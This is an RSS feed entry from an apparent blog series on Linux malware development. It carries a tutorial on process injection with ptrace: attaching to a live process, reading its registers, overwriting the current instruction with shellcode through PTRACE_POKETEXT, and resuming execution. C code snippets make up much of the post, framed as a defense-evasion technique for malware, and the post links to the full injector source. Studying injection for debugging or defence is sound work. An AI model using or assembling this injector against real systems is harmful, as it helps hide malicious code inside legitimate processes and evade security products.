<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Linux Malware Development on GILBERT ROBERT M</title>
        <link>https://mutur4.github.io/posts/linux-malware-development/</link>
        <description>Recent content in Linux Malware Development on GILBERT ROBERT M</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>sas</copyright>
        <lastBuildDate>Tue, 23 Aug 2022 14:10:19 -0400</lastBuildDate>
        <atom:link href="https://mutur4.github.io/posts/linux-malware-development/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Process Injection - (Part 1)</title>
            <link>https://mutur4.github.io/posts/linux-malware-development/process-injection/</link>
            <pubDate>Sun, 21 Aug 2022 04:02:29 -0400</pubDate>
            
            <guid>https://mutur4.github.io/posts/linux-malware-development/process-injection/</guid>
            <description>Process Injection is a defense evasion technique that is often employed within malware and entails a method of executing arbitrary code in the address space of a separate live process, therefore, this allows access to the process&amp;rsquo;s memory, system resources and possibly network resources.
Execution via process injection may also provide a way to evade detection from security products (anti-viruses) because the execution is masked under a legitimate process.
There are other useful purposes of process injection, this includes the use of debuggers to hook and debug applications, also some antivirus softwares inject into web browsers to monitor traffic and also block malicious web content.</description>
            <content type="html"><![CDATA[<p><strong>Process Injection</strong> is a defense evasion technique that is often employed within malware and entails a method of executing <em>arbitrary code</em> in the address space of a separate live process, therefore, this allows access to the process&rsquo;s memory, system resources and possibly network resources.</p>
<p>Execution via process injection may also provide a way to evade detection from security products <em>(anti-viruses)</em> because the execution is masked under a legitimate process.</p>
<p>There are other useful purposes of process injection, this includes the use of <em>debuggers</em> to hook and debug applications, also some <em>antivirus</em> softwares inject into web browsers to monitor traffic and also block malicious web content.</p>
<hr>
<p>There are two main ways that code can be injected into a process and they are as follows.</p>
<ol>
<li>A <em>legitimate process</em> is started and arbitrary code is injected into the process for execution.</li>
<li>Code injection into a already running live processes. <em>(this comes with a disadvantage since we cannot inject into a process owned by another user)</em>.</li>
</ol>
<p>For this <a href="https://mutur4.github.io/posts/linux-malware-development/process-injection/">first part</a>, we will inject code into a currently running live process that we will create. Unlike windows that uses different windows API calls, in Linux we will use the <code>ptrace</code> system call.</p>
<h3 id="ptrace-system-call">Ptrace System Call</h3>
<p>The <em>ptrace()</em> system call in Linux, is a system call that provides a means by which one process can control and observe the execution of another process and examine and change its <em>memory</em> and <em>register</em> values. The signature for the system call is as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>long ptrace<span style="color:#f92672">(</span>enum __ptrace_request request, pid_t pid, void *addr, void *data<span style="color:#f92672">)</span>;
</span></span></code></pre></div><p>The arguments passed to the function are :</p>
<ul>
<li><code>pid</code> - This is the process identifier of the process in which we will inject malicious code into.</li>
<li><code>ptrace request</code> - These are a group of constants that are accepted by <em>ptrace()</em> used to specify the action to be performed. A list of these requests and their usage are specified in <em>ptrace()&rsquo;s</em> man page <code>man ptrace</code>.</li>
</ul>
<p>The <em>addr</em> and the <em>data</em> arguments are passed to the system call depending on the request type passed to <em>ptrace()</em> , this is because, some requests can ignore or use these values.</p>
<p>To understand how <em>ptrace()</em> can be used to  attached to a process, we will write a simple C application that is as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#define _GNU_SOURCE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/ptrace.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/wait.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/user.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv){
</span></span><span style="display:flex;"><span>	pid_t pid;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>){
</span></span><span style="display:flex;"><span>		fprintf(stderr, <span style="color:#e6db74">&#34;Usage %s &lt;pid&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	pid <span style="color:#f92672">=</span> atoi(argv[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(ptrace(PTRACE_ATTACH, pid, NULL, NULL) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>		perror(<span style="color:#e6db74">&#34;ptrace()&#34;</span>);
</span></span><span style="display:flex;"><span>		_exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	waitpid(pid, NULL, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>	fprintf(stderr, <span style="color:#e6db74">&#34;* Attached to the process %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pid);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><blockquote>
<p><strong>NOTE</strong>: <em>Using the above code snippet, we will add more code to expand its functionality.</em></p>
</blockquote>
<p>The above code will simply take the <code>pid</code> of a process as its command line argument and will try to attach to that process. <em>ptrace()</em> takes the request <strong>PTRACE ATTACH</strong> that ignores the <em>addr</em> and the <em>data</em> arguments, therefore, these values are passed as <em>NULLs</em>. Attaching to a process may fail with a <strong>permission denied</strong> because of one of the following reasons:</p>
<ul>
<li>If the process is owned by another user, <em>i.e trying to inject into a root process</em></li>
<li>If the process is attached to another process <em>i.e A debugger or Linux utilities like <strong>ptrace</strong>, <strong>strace</strong> etc..</em></li>
</ul>
<p>When the process is succesfully attached, it is stopped by sending a <em>SIGTRAP</em> signal and <em>waitpid()</em> is used to wait for the delivery of the signal, and after that, we now have full control of the attached process.</p>
<p>The following is the code for the process that we will try to attach to:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>){
</span></span><span style="display:flex;"><span>	fprintf(stdout, <span style="color:#e6db74">&#34;*pid %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, getpid());
</span></span><span style="display:flex;"><span>	sleep(<span style="color:#ae81ff">1000</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>When executed the above code returns its process identifier <em>(pid)</em> and <em>sleep()&rsquo;s</em> for <code>1000</code> seconds giving use time to attach to it. Running our injector application above, will attach to this process giving use full control of the process&rsquo; resources.</p>
<h3 id="controllling-registers">Controllling Registers</h3>
<p>Using <em>ptrace()</em>, with the request <strong>PTRACE_GETREGS</strong>, allows us to access all the registers in the attached process. The <em>user_regs_struct</em> structure from the <code>user.h</code> header is used to store these registers and this is passed as the third argument <em>data</em>.</p>
<p>To this moment, we have only attached to a process; we can now access its register values and the code snippet below does exactly that</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>	fprintf(stdout, <span style="color:#e6db74">&#34;* Getting Registers </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pid);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> user_regs_struct regs;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (ptrace(PTRACE_GETREGS, pid, NULL, <span style="color:#f92672">&amp;</span>regs)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>		perror(<span style="color:#e6db74">&#34;PTRACE_GETREGS&#34;</span>);
</span></span><span style="display:flex;"><span>		_exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	fprintf(stdout, <span style="color:#e6db74">&#34;(rip) %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, regs.rip);
</span></span><span style="display:flex;"><span>	fprintf(stdout, <span style="color:#e6db74">&#34;(rsp) %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, regs.rsp);
</span></span><span style="display:flex;"><span>	fprintf(stdout, <span style="color:#e6db74">&#34;(rbp) %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, regs.rbp);
</span></span></code></pre></div><p>The values of all the registers in the process are filled and can now be accessed from the struct variable. Above, using <em>fprintf()</em>, the values of some of the main <em>pointer</em> registers are accessed and printed on screen for POC.</p>
<p><em>ptrace()</em> using the <strong>PTRACE_SETREGS</strong> request, allows us to set the value of these registers to any value of our choice. This is where our control comes in handly since we can set the value of rip to point to the address of our injected code and return execution back to the process. There are a couple of places where code can be injected:</p>
<ol>
<li>The code can be inserted in the current instruction that is being executed, this is the current address held by the rip register.</li>
<li>Code can be injected on the stack and execution redirected there, this is always a disavantage because most stacks are not executable as a protection against stack buffer overflow via shellcode injection.</li>
<li>Code an also be injected in any memory region mapped to executable, this region should always have executable permissions set.</li>
<li>Code injection in the executable&rsquo;s <em>code cave</em>. A code cave can be defined as a region with a contigous series of unused or null bytes that exists when a program is loaded in memory, this happens because of page aligments.</li>
</ol>
<p>For simplicity, we will inject code in the current address held by the <code>rip</code> register. The following is a block of code that will be used to inject malicious code into a chosen memory address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">inject_code</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>payload, pid_t pid, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>dest){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(size_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> strlen(SHELLCODE); i<span style="color:#f92672">+=</span> <span style="color:#ae81ff">8</span>, payload<span style="color:#f92672">++</span>, dest<span style="color:#f92672">++</span>){
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (ptrace(PTRACE_POKETEXT, pid, dest, <span style="color:#f92672">*</span>payload) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>                        perror(<span style="color:#e6db74">&#34;POKTEXT&#34;</span>);
</span></span><span style="display:flex;"><span>                        _exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>        } 
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The ptrace request <strong>PTRACE_POKETEXT</strong> will take the <code>addr</code> and the <code>data</code> pointers and arguments and whatever is in <code>data</code> will be copied to <code>addr</code>.
Since this a 64-bit application we increment the iterator with 8 bytes. The <strong>PTRACE_PEEKTEXT</strong> request does the opposite and is used to read data from a memory region.</p>
<h3 id="executing-injected-code">Executing Injected Code</h3>
<p>Since the current address where <code>rip</code> was pointing to is overwritten with our malicious code we now have to return registers back to the process. As stated above the request <strong>PTRACE_SETREGS</strong> is used. This takes the <code>data</code> argument which is the address of the <code>user_regs_struct</code> structure.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> user_regs_struct new_regs;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>	memcpy(<span style="color:#f92672">&amp;</span>new_regs, <span style="color:#f92672">&amp;</span>regs, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> user_regs_struct));
</span></span><span style="display:flex;"><span>        new_regs.rip <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(ptrace(PTRACE_SETREGS, pid, NULL, <span style="color:#f92672">&amp;</span>new_regs) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>                perror(<span style="color:#e6db74">&#34;PTRACE_SETREGS&#34;</span>);
</span></span><span style="display:flex;"><span>                _exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(ptrace(PTRACE_CONT, pid, NULL, NULL) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>                perror(<span style="color:#e6db74">&#34;PTRACE_DETACH&#34;</span>);
</span></span><span style="display:flex;"><span>                _exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        fprintf(stdout, <span style="color:#e6db74">&#34;* successfully injected code into the process&#34;</span>);
</span></span></code></pre></div><p>The request <strong>PTRACE_CONT</strong> will resume the process from its saved stated, this will also subtract 2 bytes from the instruction pointer, therefore we add 2 bytes to excatly point the instruction pointer to the address of our injected shellcode.The <strong>PTRACE_DETACH</strong> request will resume execution to the attached process, therefore, executing the injected code. The complete code can be located at <a href="https://github.com/mutur4/Linux-Malware/blob/main/Process%20Injection/current_instruction/inject.c">inject.c</a> and after the code is executed we get Arbitray Code Execution.</p>
<h3 id="conclusion">Conclusion</h3>
<p>This was a simple introduction to process injection, where we injected shellcode into a live process. In the next part we will look at more advanced process injection techniques where injection will prevent the injected process from terminating or crashing.</p>
<h3 id="references">References</h3>
<ul>
<li><input checked="" disabled="" type="checkbox"> <a href="https://papers.vx-underground.org/papers/Linux/Process%20Injection/Infecting%20Running%20Processes.pdf">https://papers.vx-underground.org/papers/Linux/Process%20Injection/Infecting%20Running%20Processes.pdf</a></li>
</ul>
]]></content>
        </item>
        
    </channel>
</rss>
